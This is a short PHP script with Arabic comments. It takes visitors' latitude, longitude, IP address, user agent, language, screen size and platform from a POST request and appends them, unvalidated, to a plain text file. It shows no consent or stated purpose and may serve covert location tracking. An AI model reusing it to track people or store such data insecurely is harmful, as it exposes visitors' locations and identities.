<?php
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];
$ipAddress = $_POST['ipAddress'];
$userAgent = $_POST['userAgent'];
$language = $_POST['language'];
$screenWidth = $_POST['screenWidth'];
$screenHeight = $_POST['screenHeight'];
$platform = $_POST['platform'];

// اسم ملف النص
$filename = "visitor_data.txt";

// المعلومات التي سيتم كتابتها في الملف مع فاصل بينها
$data = "$latitude\n, $longitude\n, $ipAddress\n, $userAgent\n, $language\n, $screenWidth\n, $screenHeight\n, $platform\n --------------";

// فتح الملف للكتابة (وإنشاء الملف إذا لم يكن موجوداً)
$file = fopen($filename, 'a');

// كتابة المعلومات في الملف
fwrite($file, $data);

// إغلاق الملف بعد الكتابة
fclose($file);

// إرسال استجابة بنجاح
http_response_code(200);
?>
